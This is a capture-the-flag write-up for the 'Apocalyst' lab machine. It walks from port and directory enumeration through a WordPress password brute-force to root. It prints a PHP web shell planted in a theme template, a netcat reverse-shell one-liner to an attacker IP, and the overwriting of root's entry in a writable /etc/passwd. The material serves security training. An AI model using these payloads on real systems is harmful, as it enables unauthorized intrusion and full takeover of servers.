# Apocalyst Writeup


## Enumeration

#### Port Scanning
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-25 05:20 UTC
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 21.07% done; ETC: 05:20 (0:00:07 remaining)
Warning: 10.129.220.250 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.220.250
Host is up (0.064s latency).
Not shown: 933 closed ports, 65 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 12.25 seconds
```

#### Directory Fuzzing

Running _gobuster_ on the website didn't reveal anything of meaning, so I ran CEWL on the website, and ran that wordlist against it. 

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.220.250/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                words
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              -t
[+] Timeout:                 10s
===============================================================
2021/11/25 05:30:19 Starting gobuster in directory enumeration mode
===============================================================
/Revelation           (Status: 301) [Size: 321] [--> http://10.129.220.250/Revelation/]
/Book                 (Status: 301) [Size: 315] [--> http://10.129.220.250/Book/]      
/Daniel               (Status: 301) [Size: 317] [--> http://10.129.220.250/Daniel/]    
/the                  (Status: 301) [Size: 314] [--> http://10.129.220.250/the/]       
/end                  (Status: 301) [Size: 314] [--> http://10.129.220.250/end/]       
/that                 (Status: 301) [Size: 315] [--> http://10.129.220.250/that/]      
/and                  (Status: 301) [Size: 314] [--> http://10.129.220.250/and/]       
/entry                (Status: 301) [Size: 316] [--> http://10.129.220.250/entry/]     
/The                  (Status: 301) [Size: 314] [--> http://10.129.220.250/The/]       
/for                  (Status: 301) [Size: 314] [--> http://10.129.220.250/for/]       
<snipped>
```
The list of found directories was very long. There were only a few contents that returned a size bigger than 323, so I inspected each individually. Each one had the same picture on it. The source code for each was also all the same except for one. 

Once I downloaded that image, I ran _stegseek_ on the image, which cracked it and produced another wordlist. I then ran this wordlist on the login page, since it's a wordpress site. I ran `wpscan --url http://apocalyst.htb/ --passwords worlist.txt -U falaraki`. Falaraki is the author of the three blogposts on the site, so I assumed that that would be a valid username. 

This succeeded in finding me a valid login, which then gave me access to the admin panel. 

## Initial Access

For initial access, I went to Appearance -> Editor -> Error 404 Template, and added this line:

`if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }`

This takes a GET parameter called **cmd**, and executes it, displaying the contents to the page. The only way to run it is to pass that parameter on a 404 page, for example, _http://apocalyst.htb/?p=6&cmd=ls_. 

Now that we had RCE, we just have to get a shell. Passing the reverse shell command in the URL bar didn't work too well for me, so I used _curl_. `curl "http://apocalyst.htb/?p=6&" --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.131 443 >/tmp/f"`

## Privelege Escalation

Next, I found I could read a file called _.secret_ in falaraki's home directory, even though I was www-data. The contents were a Base64 encoded password. With that, I logged in over SSH as falaraki for a more stable shell/TTY. 

Finally, I didn't find anything obvious, so I ran LinPEAS on it, which found that /etc/passwd was writeable by my user. I ran `openssl passwd <my_password>` on my host to create a correctly encrypted password that fits the /etc/passwd format, then pasted it into the root user's line in /etc/passwd.

Then, I su'd to root, using the password I just created. 
